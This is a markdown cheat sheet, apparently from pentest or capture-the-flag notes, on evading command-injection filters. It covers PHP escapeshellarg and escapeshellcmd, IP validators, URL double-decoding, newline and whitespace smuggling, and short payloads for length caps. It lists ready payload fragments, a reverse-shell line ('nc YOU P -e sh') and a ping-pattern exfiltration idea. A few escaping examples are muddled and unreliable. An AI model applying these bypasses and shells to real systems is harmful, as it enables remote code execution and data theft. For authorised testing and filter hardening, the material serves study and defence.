# Filter Bypass — the systematic evasion survey

## Filter taxonomy — first identify WHICH filter

| Filter type | Tell | Bypass family |
|---|---|---|
| substring blacklist (`cat`, `flag`, `nc`) | specific words 403/reset | quoting/globbing/encoding |
| char blacklist (`;`, `|`, space) | specific chars rejected | alternates/IFS/braces |
| whitelist regex `^[a-z0-9.]+$` | everything rejected | argv-boundary only |
| shell-escape (`escapeshellarg`) | wraps value in quotes | quoting.md — close the quote |
| param validation (is_ip) | strict format | argument-injection.md |
| WAF signature (modsec) | 403 on known patterns | waf-bypass.md |
| length cap | truncated | shorthand payloads |
| multi-layer (several of the above) | progressive rejects | combine techniques |

## `escapeshellarg`/`escapeshellcmd` — the PHP specifics

`escapeshellarg($v)` wraps `'...'` + escapes inner `'` → `\"'\"'\"` —
a payload `'` becomes `'\''`. Escapes:

```
' then inject needs the wrap to break: '\\'';id;\''  — messy
better: if escapeshellarg is used, $INPUT can't close quotes — dead?
  → BUT: escapeshellarg on Windows is DIFFERENT: replaces " % ! with spaces
  → AND: it doesn't escape $ ` inside '...' on some builds — actually it does wrap fully
```

`escapeshellcmd` escapes `&#;`|*?~<>^()[]{}$\, \x0A \xFF` and unquoted
`'"` — metachars escaped, but **argv position still gets through as
flags** → argument-injection.

The `escapeshellarg` bypass family (CVE-2015-4642 etc): on Windows it
doesn't escape `%`/`!` — `%COMSPEC%`/`!var!` expansion — mostly legacy.

## is_ip / is_hostname validators — can't inject, so inject FLAGS

`filter_var($x, FILTER_VALIDATE_IP)` blocks `;` — but what about `-`?
`127.0.0.1` fails validation if you add `;` — BUT the validator may run
on a DIFFERENT field than the one concatenated into the command —
`form-field confusion`: inject into `host2`/`interface`/`iface` fields.

Also: `127.0.0.1` passes `is_ip` but `ping` takes options too —
`-c`/`-i`/`-W` — if the arg position allows a flag after the IP, `-v` or
`-p pattern` (ping pattern payloads!). `ping -p` fills payload bytes —
an exfil channel.

## URL-encoding games — decode-side differences

```
%3B → ;       standard
%3b → ;       case
%253B → %3B → ;  double-decode (app decodes twice!)
%3B%20id      — mixed
+%3B          — + = space in query
```

Filter sees `%3B` (safe chars), app decodes to `;` — the classic
double-decode gap. Also `%u003B` on IIS, `%0a` newline.

## Case + comment tricks

`CAT`/`Cat`/`cAt` — case-variant against case-sensitive filters; shell
resolves case-insensitively? NO — POSIX is case-sensitive! `CAT` ≠ `cat`.
BUT: `${CAT,,}` case-folds (bash), or find `CAT` via glob — nope, glob is
case-sensitive too. Case tricks only help when the COMMAND is
case-insensitive (Windows) or the FILTER is case-sensitive against the
literal uppercase string while a var-fold happens.

## Whitespace variants past ` ` filters

`%09` tab / `%0a` newline / `%0d` CR / `%0b` VT / `%0c` FF / `$IFS` /
`{a,b}` / `${IFS$9}` — all in `char-restriction.md`.

## Newline smuggling — the single biggest miss

Filters `preg_match('/[;&|]/', $x)` don't include `\n` — `%0a` is the
highest-yield single bypass for `;`-blockers.

## Comments inside payloads — `#` mid-token

`;id#x` vs `;#id` — `#` comments from it onward — `#x` vs `;#` position:
`id#x` makes `id#x` a name (command not found), `id;#x` runs id.

## Length cap → shorthand payloads

| Need | Shortest |
|---|---|
| exec marker | `id` (2), `whoami` (6), `pwd` (3) |
| separator | `|` or `&` or `;` (1) or `\n` (1) |
| read flag | `cat /f` if flag at `/f` |
| reverse | `nc YOU P -e sh` |
| sleep | `sleep 3` |

## Multi-filter ordering — apply evasions in this order

1. identify which chars are blocked (byte-scan the field)
2. pick the decode/substitution form that avoids those bytes
3. if the check is layered, encode the payload so the CHECK sees the
   encoded form and the SINK gets the decoded — or vice versa

## The "it's not a filter, it's a different parser" trap — honeypot filters

Sometimes a "filter" is the app running your input through a DIFFERENT
shell (`sh -c "check $x"` for validation, then `bash -c "run $x"` for
execution) — syntax valid in bash but not dash sneaks through validation
and executes in bash.

## Falsifiers

- every byte class blocked AND argv position can't hold flags AND no
  decode asymmetry

## Output to record

- which bytes/names are blocked + which evasion passed + the layered
  filter order observed
